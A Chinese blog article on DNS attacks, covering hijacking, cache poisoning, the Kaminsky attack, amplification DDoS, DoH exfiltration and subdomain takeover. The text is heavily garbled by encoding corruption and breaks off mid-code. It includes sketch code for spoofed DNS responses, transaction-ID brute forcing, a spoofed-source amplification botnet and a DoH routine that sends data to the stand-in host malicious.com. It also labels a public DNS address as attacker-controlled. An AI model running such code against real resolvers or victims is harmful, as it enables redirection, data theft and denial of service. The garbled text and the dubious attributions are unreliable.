                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>å‰è¨€ï¼šDNSâ€”â€”äº’è”ç½‘çš„â€œéšå½¢ç”µè¯ç°¿â€</strong></h2>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœæ²¡æœ‰DNSï¼Œè®¿é—®æ¯ä¸ªç½‘ç«™éƒ½éœ€è¦è®°ä½ä¸€ä¸²åƒ<code>192.168.1.1</code>è¿™æ ·çš„æ•°å­—ã€‚DNSè®©äº’è”ç½‘å˜å¾—äººæ€§åŒ–ï¼Œä½†æ­£æ˜¯è¿™ä¸ªæ¯æ—¥å¤„ç†<strong>æ•°åƒäº¿æ¬¡æŸ¥è¯¢</strong>çš„ç³»ç»Ÿï¼Œå´æˆä¸ºäº†ç½‘ç»œæ”»å‡»è€…çš„é»„é‡‘ç›®æ ‡ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢ç´¢DNSä¸–ç•Œçš„é˜´æš—é¢ï¼Œäº†è§£é‚£äº›å¨èƒæˆ‘ä»¬ç½‘ç»œå®‰å…¨çš„å„ç§æ”»å‡»æ‰‹æ®µã€‚</p>
<h2 data-id="heading-1"><strong>ä¸€ã€DNSåŠ«æŒï¼šå½“ä½ çš„å¯¼èˆªç³»ç»Ÿè¢«é»‘å®¢æ¥ç®¡</strong></h2>
<h3 data-id="heading-2"><strong>1.1 ä»€ä¹ˆæ˜¯DNSåŠ«æŒï¼Ÿ</strong></h3>
<p>DNSåŠ«æŒå°±åƒæœ‰äººä¿®æ”¹äº†ä½ çš„GPSå¯¼èˆªç³»ç»Ÿï¼Œå°†â€œå‰å¾€é“¶è¡Œâ€çš„æŒ‡ä»¤å˜æˆäº†â€œå‰å¾€é»‘å®¢çš„å‡é“¶è¡Œâ€ã€‚</p>
<p><strong>æŠ€æœ¯åŸç†</strong>ï¼š
æ”»å‡»è€…é€šè¿‡ä¸­é—´äººæ”»å‡»æˆ–æ¶æ„è½¯ä»¶ï¼Œç¯¡æ”¹DNSå“åº”ï¼Œå°†åˆæ³•åŸŸåè§£æåˆ°æ¶æ„IPåœ°å€ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ”»å‡»è€…è§†è§’çš„DNSåŠ«æŒæµç¨‹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">dns_hijack_attack</span>():
    <span class="hljs-comment"># 1. ç›‘æ§ç½‘ç»œæµé‡</span>
    sniff_packets(<span class="hljs-built_in">filter</span>=<span class="hljs-string">"udp port 53"</span>)
    
    <span class="hljs-comment"># 2. æ‹¦æˆªDNSæŸ¥è¯¢</span>
    <span class="hljs-keyword">if</span> packet.haslayer(DNS) <span class="hljs-keyword">and</span> packet[DNS].qd.qname == <span class="hljs-string">"bank.com"</span>:
        <span class="hljs-comment"># 3. ä¼ªé€ å“åº”ï¼ŒæŒ‡å‘æ¶æ„æœåŠ¡å™¨</span>
        malicious_ip = <span class="hljs-string">"192.168.1.100"</span>
        send_spoofed_response(packet, malicious_ip)
    
    <span class="hljs-comment"># ç”¨æˆ·è®¿é—®bank.comï¼Œå®é™…è¿æ¥åˆ°æ”»å‡»è€…æœåŠ¡å™¨</span>
</code></pre>
<h3 data-id="heading-3"><strong>1.2 åŠ«æŒçš„å¤šç§å½¢å¼</strong></h3>
<h4 data-id="heading-4"><strong>è·¯ç”±å™¨åŠ«æŒ</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ”»å‡»è€…æ”»ç ´å®¶ç”¨è·¯ç”±å™¨åä¿®æ”¹DNSè®¾ç½®</span>
<span class="hljs-comment"># åŸå§‹é…ç½®ï¼š</span>
<span class="hljs-comment"># nameserver 8.8.8.8  # Google DNS</span>

<span class="hljs-comment"># è¢«ç¯¡æ”¹åï¼š</span>
<span class="hljs-comment"># nameserver 10.0.0.1  # æ”»å‡»è€…æ§åˆ¶çš„DNSæœåŠ¡å™¨</span>
</code></pre>
<h4 data-id="heading-5"><strong>æœ¬åœ°Hostsæ–‡ä»¶åŠ«æŒ</strong></h4>
<pre><code class="hljs language-plaintext" lang="plaintext"># Windows hostsæ–‡ä»¶ä½ç½®ï¼šC:\Windows\System32\drivers\etc\hosts
# æ¶æ„è½¯ä»¶æ·»åŠ ï¼š
192.168.1.100  www.bank.com
192.168.1.100  www.paypal.com
# æ‰€æœ‰é“¶è¡Œè®¿é—®éƒ½é‡å®šå‘åˆ°æ”»å‡»è€…æœåŠ¡å™¨
</code></pre>
<h4 data-id="heading-6"><strong>ISPçº§åˆ«çš„åŠ«æŒ</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æŸäº›ISPä¼šåŠ«æŒä¸å­˜åœ¨çš„åŸŸå</span>
<span class="hljs-comment">// ç”¨æˆ·æŸ¥è¯¢ï¼šnonexistent-website.com</span>
<span class="hljs-comment">// æ­£å¸¸å“åº”ï¼šNXDOMAINï¼ˆåŸŸåä¸å­˜åœ¨ï¼‰</span>
<span class="hljs-comment">// åŠ«æŒå“åº”ï¼šæŒ‡å‘ISPçš„å¹¿å‘Šæˆ–æœç´¢é¡µé¢</span>
</code></pre>
<h3 data-id="heading-7"><strong>1.3 çœŸå®æ¡ˆä¾‹ï¼šå·´è¥¿é“¶è¡Œå¤§åŠ«æ¡ˆ</strong></h3>
<p><strong>2016å¹´å·´è¥¿é“¶è¡Œæ”»å‡»</strong>ï¼š</p>
<ul>
<li><strong>æ‰‹æ³•</strong>ï¼šæ¶æ„è½¯ä»¶ä¿®æ”¹è·¯ç”±å™¨å’Œç”µè„‘çš„DNSè®¾ç½®</li>
<li><strong>ç›®æ ‡</strong>ï¼š40å¤šå®¶å·´è¥¿é“¶è¡Œ</li>
<li><strong>æŸå¤±</strong>ï¼šæ•°ç™¾ä¸‡ç¾å…ƒ</li>
<li><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼š
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ¶æ„è½¯ä»¶æ‰§è¡Œçš„DNSä¿®æ”¹</span>
<span class="hljs-keyword">import</span> subprocess

<span class="hljs-comment"># ä¿®æ”¹Windows DNSè®¾ç½®</span>
subprocess.run([
    <span class="hljs-string">'netsh'</span>, <span class="hljs-string">'interface'</span>, <span class="hljs-string">'ip'</span>, <span class="hljs-string">'set'</span>, <span class="hljs-string">'dns'</span>,
    <span class="hljs-string">'Ethernet'</span>, <span class="hljs-string">'static'</span>, <span class="hljs-string">'185.228.168.168'</span>
])

<span class="hljs-comment"># 185.228.168.168æ˜¯æ”»å‡»è€…æ§åˆ¶çš„æ¶æ„DNSæœåŠ¡å™¨</span>
</code></pre>
</li>
</ul>
<h2 data-id="heading-8"><strong>äºŒã€DNSæ±¡æŸ“ï¼šåœ¨äº’è”ç½‘æ°´æºä¸­æŠ•æ¯’</strong></h2>
<h3 data-id="heading-9"><strong>2.1 DNSæ±¡æŸ“çš„å·¥ä½œåŸç†</strong></h3>
<p>DNSæ±¡æŸ“åˆç§°DNSç¼“å­˜æŠ•æ¯’ï¼Œæ”»å‡»è€…å‘DNSç¼“å­˜ä¸­æ³¨å…¥è™šå‡è®°å½•ã€‚</p>
<p><strong>æ”»å‡»æ—¶åºå›¾</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    ç”¨æˆ·-&gt;&gt;æœ¬åœ°DNS: æŸ¥è¯¢ evil.com
    æœ¬åœ°DNS-&gt;&gt;æ ¹æœåŠ¡å™¨: æŸ¥è¯¢ .com NS
    æ”»å‡»è€…-&gt;&gt;æœ¬åœ°DNS: ä¼ªé€ å“åº”(å‡çš„æƒå¨æœåŠ¡å™¨)
    æœ¬åœ°DNS-&gt;&gt;å‡æƒå¨æœåŠ¡å™¨: æŸ¥è¯¢ evil.com
    å‡æƒå¨æœåŠ¡å™¨-&gt;&gt;æœ¬åœ°DNS: è¿”å›æ¶æ„IP
    æœ¬åœ°DNS-&gt;&gt;ç”¨æˆ·: è¿”å›æ¶æ„IP
    ç”¨æˆ·-&gt;&gt;æ¶æ„ç½‘ç«™: è®¿é—® (è¢«æ”»å‡»)
</code></pre>
<h3 data-id="heading-10"><strong>2.2 æŠ€æœ¯å®ç°ç»†èŠ‚</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DNSPoisoningAttack</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_dns_server</span>):
        self.target = target_dns_server
        self.transaction_id = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">65535</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">poison_cache</span>(<span class="hljs-params">self, domain, malicious_ip</span>):
        <span class="hljs-comment"># å…³é”®ï¼šé¢„æµ‹DNSæŸ¥è¯¢çš„Transaction ID</span>
        <span class="hljs-keyword">for</span> txid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
            <span class="hljs-comment"># ä¼ªé€ æƒå¨æœåŠ¡å™¨å“åº”</span>
            spoofed_response = IP(dst=self.target)/UDP(dport=<span class="hljs-number">53</span>)/DNS(
                <span class="hljs-built_in">id</span>=txid,
                qr=<span class="hljs-number">1</span>,  <span class="hljs-comment"># å“åº”æ ‡å¿—</span>
                qd=DNSQR(qname=domain),
                an=DNSRR(rrname=domain, ttl=<span class="hljs-number">86400</span>, rdata=malicious_ip)
            )
            send(spoofed_response)
            
            <span class="hljs-comment"># åŒæ—¶å‘é€å¤§é‡æŸ¥è¯¢è§¦å‘ç›®æ ‡DNSçš„æŸ¥è¯¢</span>
            trigger_query = IP(dst=self.target)/UDP()/DNS(
                <span class="hljs-built_in">id</span>=txid,
                qd=DNSQR(qname=domain)
            )
            send(trigger_query)
</code></pre>
<h3 data-id="heading-11"><strong>2.3 Kaminskyæ¼æ´ï¼šæ”¹å˜æ¸¸æˆè§„åˆ™</strong></h3>
<p><strong>2008å¹´å‘ç°</strong>ï¼Œå…è®¸æ”»å‡»è€…åœ¨ç§’çº§æ—¶é—´å†…æ±¡æŸ“DNSç¼“å­˜ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">kaminsky_exploit</span>(<span class="hljs-params">target_dns, domain</span>):
    <span class="hljs-comment"># 1. æŸ¥è¯¢ç›®æ ‡åŸŸåçš„å­åŸŸåï¼ˆæ¯æ¬¡ä¸åŒï¼‰</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
        subdomain = <span class="hljs-string">f"<span class="hljs-subst">{random_string(<span class="hljs-number">10</span>)}</span>.<span class="hljs-subst">{domain}</span>"</span>
        
        <span class="hljs-comment"># 2. è§¦å‘ç›®æ ‡DNSå‘ä¸Šæ¸¸æŸ¥è¯¢</span>
        send_query(target_dns, subdomain)
        
        <span class="hljs-comment"># 3. å‘é€å¤§é‡ä¼ªé€ å“åº”ï¼Œå°è¯•é¢„æµ‹Transaction ID</span>
        <span class="hljs-keyword">for</span> txid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
            send_spoofed_response(
                target_dns,
                subdomain,
                malicious_ip,
                txid
            )
        
        <span class="hljs-comment"># 4. å¦‚æœæˆåŠŸï¼Œæ•´ä¸ªåŸŸçš„ç¼“å­˜éƒ½è¢«æ±¡æŸ“</span>
        <span class="hljs-keyword">if</span> check_poisoned(target_dns, domain):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h2 data-id="heading-12"><strong>ä¸‰ã€DNSæ”¾å¤§æ”»å‡»ï¼šå°é—®é¢˜å¼•å‘å¤§ç¾éš¾</strong></h2>
<h3 data-id="heading-13"><strong>3.1 æ”¾å¤§æ•ˆåº”çš„æ•°å­¦åŸç†</strong></h3>
<pre><code class="hljs language-scss" lang="scss">åŸºæœ¬å…¬å¼ï¼šæ”¾å¤§å€æ•° = å“åº”å¤§å° / æŸ¥è¯¢å¤§å°

æŸ¥è¯¢ä¾‹å­ï¼šexample<span class="hljs-selector-class">.com</span> ANY (<span class="hljs-number">60</span>å­—èŠ‚)
å“åº”ä¾‹å­ï¼šåŒ…å«æ‰€æœ‰è®°å½•ç±»å‹ (<span class="hljs-number">4000</span>å­—èŠ‚)
æ”¾å¤§å€æ•°ï¼š<span class="hljs-number">4000</span> Ã· <span class="hljs-number">60</span> â‰ˆ <span class="hljs-number">67</span>å€
</code></pre>
<p><strong>ä¸åŒç±»å‹è®°å½•çš„æ”¾å¤§æ•ˆæœ</strong>ï¼š</p>









































<table><thead><tr><th>è®°å½•ç±»å‹</th><th>æŸ¥è¯¢å¤§å°</th><th>å…¸å‹å“åº”</th><th>æ”¾å¤§å€æ•°</th></tr></thead><tbody><tr><td>Aè®°å½•</td><td>60å­—èŠ‚</td><td>100å­—èŠ‚</td><td>1.7å€</td></tr><tr><td>MXè®°å½•</td><td>60å­—èŠ‚</td><td>500å­—èŠ‚</td><td>8.3å€</td></tr><tr><td>TXTè®°å½•</td><td>60å­—èŠ‚</td><td>3000å­—èŠ‚</td><td>50å€</td></tr><tr><td>ANYè®°å½•</td><td>60å­—èŠ‚</td><td>4000å­—èŠ‚</td><td>67å€</td></tr><tr><td>DNSSEC</td><td>60å­—èŠ‚</td><td>4000+å­—èŠ‚</td><td>70+å€</td></tr></tbody></table>
<h3 data-id="heading-14"><strong>3.2 åƒµå°¸ç½‘ç»œçš„è§„æ¨¡åŒ–æ”»å‡»</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DDoSBotnet</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, bot_count=<span class="hljs-number">10000</span></span>):
        self.bots = self.load_bots(bot_count)
        self.open_dns_servers = self.scan_open_resolvers()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">launch_amplification_attack</span>(<span class="hljs-params">self, victim_ip</span>):
        <span class="hljs-comment"># æ¯ä¸ªåƒµå°¸æ‰§è¡Œ</span>
        <span class="hljs-keyword">for</span> bot <span class="hljs-keyword">in</span> self.bots:
            <span class="hljs-comment"># é€‰æ‹©æ”¾å¤§å€æ•°æœ€é«˜çš„è®°å½•ç±»å‹</span>
            record_type = self.select_optimal_record()
            
            <span class="hljs-comment"># æ„é€ ä¼ªé€ è¯·æ±‚</span>
            query = DNS(
                <span class="hljs-built_in">id</span>=random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">65535</span>),
                qd=DNSQR(qname=self.target_domain, qtype=record_type)
            )
            
            <span class="hljs-comment"># å‘é€åˆ°å¤šä¸ªå¼€æ”¾DNSæœåŠ¡å™¨</span>
            <span class="hljs-keyword">for</span> dns_server <span class="hljs-keyword">in</span> self.open_dns_servers[:<span class="hljs-number">10</span>]:
                spoofed_packet = IP(
                    src=victim_ip,  <span class="hljs-comment"># ä¼ªé€ æºåœ°å€</span>
                    dst=dns_server
                )/UDP(sport=random_port(), dport=<span class="hljs-number">53</span>)/query
                
                bot.send(spoofed_packet)
        
        <span class="hljs-comment"># è®¡ç®—æ€»æ”»å‡»æµé‡</span>
        total_traffic = self.calculate_amplification()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç†è®ºæœ€å¤§æµé‡ï¼š<span class="hljs-subst">{total_traffic/<span class="hljs-number">1e9</span>:<span class="hljs-number">.2</span>f}</span> Gbps"</span>)
</code></pre>
<h3 data-id="heading-15"><strong>3.3 å²ä¸Šæœ€å¤§æ”»å‡»ï¼šDyn DNSäº‹ä»¶åˆ†æ</strong></h3>
<p><strong>2016å¹´10æœˆ21æ—¥</strong>ï¼Œé’ˆå¯¹Dyn DNSæœåŠ¡çš„æ”»å‡»ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">æ”»å‡»å‚æ•°:</span>
  <span class="hljs-string">å³°å€¼æµé‡:</span> <span class="hljs-number">1.2</span> <span class="hljs-string">Tbps</span>
  <span class="hljs-string">æŒç»­æ—¶é—´:</span> <span class="hljs-string">æŒç»­å¤šæ³¢ï¼Œæ¯æ³¢çº¦1å°æ—¶</span>
  <span class="hljs-string">æ”»å‡»æº:</span> <span class="hljs-number">10</span><span class="hljs-number">-100</span><span class="hljs-string">ä¸‡å°IoTè®¾å¤‡ç»„æˆçš„Miraiåƒµå°¸ç½‘ç»œ</span>
  <span class="hljs-string">æ”¾å¤§è½½ä½“:</span> <span class="hljs-string">å¼€æ”¾DNSé€’å½’æœåŠ¡å™¨</span> <span class="hljs-string">+</span> <span class="hljs-string">NTPæ”¾å¤§</span>
  <span class="hljs-string">å—å½±å“æœåŠ¡:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">Twitter:</span> <span class="hljs-string">å…¨çƒä¸­æ–­2å°æ—¶</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">GitHub:</span> <span class="hljs-string">æœåŠ¡ä¸¥é‡é™çº§</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">Netflix:</span> <span class="hljs-string">ç¾å›½ä¸œæµ·å²¸ç”¨æˆ·æ— æ³•è®¿é—®</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">çº½çº¦æ—¶æŠ¥ã€åå°”è¡—æ—¥æŠ¥ç­‰:</span> <span class="hljs-string">è®¿é—®å›°éš¾</span>
  
<span class="hljs-string">æŠ€æœ¯ç»†èŠ‚:</span>
  <span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">æ”»å‡»ç»„åˆ:</span> <span class="hljs-string">DNSæ”¾å¤§</span> <span class="hljs-string">+</span> <span class="hljs-string">NTPæ”¾å¤§</span> <span class="hljs-string">+</span> <span class="hljs-string">SYN</span> <span class="hljs-string">Flood</span>
  <span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">æŸ¥è¯¢ç±»å‹:</span> <span class="hljs-string">ä¸»è¦ä½¿ç”¨ANYå’ŒTXTè®°å½•</span>
  <span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">ä¼ªé€ æŠ€æœ¯:</span> <span class="hljs-string">æºåœ°å€éšæœºåŒ–ï¼Œéš¾ä»¥è¿½è¸ª</span>
  <span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">èº²é¿ç­–ç•¥:</span> <span class="hljs-string">åŠ¨æ€æ›´æ¢æ”»å‡»ç›®æ ‡å’ŒæœåŠ¡</span>
</code></pre>
<h2 data-id="heading-16"><strong>å››ã€ç°ä»£DNSå¨èƒæ¼”è¿›</strong></h2>
<h3 data-id="heading-17"><strong>4.1 DoH/DoTçš„æ–°å‹å¨èƒ</strong></h3>
<p><strong>DNS over HTTPS (DoH) çš„å®‰å…¨æ‚–è®º</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// DoHè™½ç„¶åŠ å¯†ï¼Œä½†å¼•å…¥æ–°é—®é¢˜</span>
<span class="hljs-keyword">const</span> dohThreats = {
    <span class="hljs-comment">// 1. ä¸­å¿ƒåŒ–é£é™©</span>
    <span class="hljs-attr">centralization</span>: {
        <span class="hljs-attr">providers</span>: [<span class="hljs-string">'Cloudflare'</span>, <span class="hljs-string">'Google'</span>, <span class="hljs-string">'Quad9'</span>],
        <span class="hljs-attr">risk</span>: <span class="hljs-string">'å•ç‚¹æ•…éšœï¼Œéšç§é›†ä¸­'</span>
    },
    
    <span class="hljs-comment">// 2. ä¼ä¸šç›‘æ§å›°éš¾</span>
    <span class="hljs-attr">enterprise</span>: {
        <span class="hljs-attr">issue</span>: <span class="hljs-string">'ç»•è¿‡å…¬å¸DNSç­–ç•¥'</span>,
        <span class="hljs-attr">example</span>: <span class="hljs-string">'æ¶æ„è½¯ä»¶ä½¿ç”¨DoHå¤–è”C2æœåŠ¡å™¨'</span>
    },
    
    <span class="hljs-comment">// 3. åè®®è¯†åˆ«é—®é¢˜</span>
    <span class="hljs-attr">detection</span>: {
        <span class="hljs-attr">challenge</span>: <span class="hljs-string">'DoHæµé‡ä¸æ™®é€šHTTPSéš¾ä»¥åŒºåˆ†'</span>,
        <span class="hljs-attr">solution</span>: <span class="hljs-string">'æ·±åº¦åŒ…æ£€æµ‹(DPI)'</span>
    }
};

<span class="hljs-comment">// æ¶æ„è½¯ä»¶åˆ©ç”¨DoHçš„ç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MalwareWithDoH</span> {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">exfiltrateData</span>(<span class="hljs-params">data</span>) {
        <span class="hljs-comment">// ä½¿ç”¨DoHéšè—DNSæŸ¥è¯¢</span>
        <span class="hljs-keyword">const</span> dohUrl = <span class="hljs-string">'https://cloudflare-dns.com/dns-query'</span>;
        <span class="hljs-keyword">const</span> query = <span class="hljs-title function_">btoa</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
        
        <span class="hljs-comment">// å°†æ•°æ®ç¼–ç åœ¨DNSæŸ¥è¯¢ä¸­</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">${dohUrl}</span>?name=<span class="hljs-subst">${query}</span>.malicious.com`</span>);
        
        <span class="hljs-comment">// æ”»å‡»è€…DNSæœåŠ¡å™¨è§£ææŸ¥è¯¢ï¼Œæå–æ•°æ®</span>
        <span class="hljs-keyword">return</span> response.<span class="hljs-property">ok</span>;
    }
}
</code></pre>
<h3 data-id="heading-18"><strong>4.2 å­åŸŸååŠ«æŒæ”»å‡»</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SubdomainTakeover</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_vulnerable_subdomains</span>(<span class="hljs-params">self, domain</span>):
        <span class="hljs-comment"># 1. æšä¸¾æ‰€æœ‰å­åŸŸå</span>
        subdomains = self.enumerate_subdomains(domain)
        
        vulnerable = []
        <span class="hljs-keyword">for</span> sub <span class="hljs-keyword">in</span> subdomains:
            <span class="hljs-comment"># 2. æ£€æŸ¥DNSè®°å½•ä½†æ— ä¸»æœºæœåŠ¡çš„æƒ…å†µ</span>
            dns_record = self.resolve_dns(sub)
            
            <span class="hljs-keyword">if</span> dns_record <span class="hljs-keyword">and</span> self.check_service_status(sub) == <span class="hljs-string">'no_host'</span>:
                <span class="hljs-comment"># 3. å¸¸è§æ˜“å—æ”»å‡»æœåŠ¡</span>
                <span class="hljs-keyword">if</span> dns_record[<span class="hljs-string">'type'</span>] <span class="hljs-keyword">in</span> [<span class="hljs-string">'CNAME'</span>, <span class="hljs-string">'NS'</span>]:
                    target = dns_record[<span class="hljs-string">'value'</span>]
                    
                    <span class="hljs-comment"># 4. æ£€æŸ¥æ˜¯å¦å¯ä»¥æ¥ç®¡</span>
                    <span class="hljs-keyword">if</span> self.can_takeover(target):
                        vulnerable.append({
                            <span class="hljs-string">'subdomain'</span>: sub,
                            <span class="hljs-string">'record_type'</span>: dns_record[<span class="hljs-string">'type'</span>],
                            <span class="hljs-string">'target'</span>: target,
                            <span class="hljs-string">'risk'</span>: self.assess_risk(sub)
                        })
        
        <span class="hljs-keyword">return</span> vulnerable

<span class="hljs-comment"># æ”»å‡»ç¤ºä¾‹ï¼šæ¥ç®¡Herokuåº”ç”¨</span>
<span class="hljs-comment"># 1. å…¬å¸é…ç½®ï¼šhelp.example.com CNAME -&gt; help.herokuapp.com</span>
<span class="hljs-comment"># 2. å…¬å¸åˆ é™¤äº†Herokuåº”ç”¨ï¼Œä½†å¿˜è®°åˆ é™¤DNSè®°å½•</span>
<span class="hljs-comment"># 3. æ”»å‡»è€…æ³¨å†Œhelp.herokuapp.com</span>
<span class="hljs-comment"># 4. æ‰€æœ‰è®¿é—®help.example.comçš„ç”¨æˆ·åˆ°è¾¾æ”»å‡»è€…é¡µé¢</span>
</code></pre>
<h3 data-id="heading-19"><strong>4.3 é‡å­è®¡ç®—å¯¹DNSå®‰å…¨çš„å¨èƒ</strong></h3>
<p><strong>æœªæ¥çš„å¨èƒ</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">QuantumDNSThreat</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">quantum_dns_attack</span>(<span class="hljs-params">self, encrypted_traffic</span>):
        <span class="hljs-comment"># é‡å­è®¡ç®—æœºå¯ä»¥ç ´è§£å½“å‰åŠ å¯†ç®—æ³•</span>
        algorithms_vulnerable = {
            <span class="hljs-string">'RSA-2048'</span>: <span class="hljs-string">'æ˜“å—Shorç®—æ³•æ”»å‡»'</span>,
            <span class="hljs-string">'ECC-256'</span>: <span class="hljs-string">'æ˜“å—Shorç®—æ³•æ”»å‡»'</span>,
            <span class="hljs-string">'AES-256'</span>: <span class="hljs-string">'éœ€Groverç®—æ³•ï¼Œä½†å¯å¢å¼ºå¯†é’¥'</span>
        }
        
        <span class="hljs-comment"># å¯¹DNSSECçš„å½±å“</span>
        dnssec_vulnerabilities = [
            <span class="hljs-string">'RSAç­¾åå¯è¢«ä¼ªé€ '</span>,
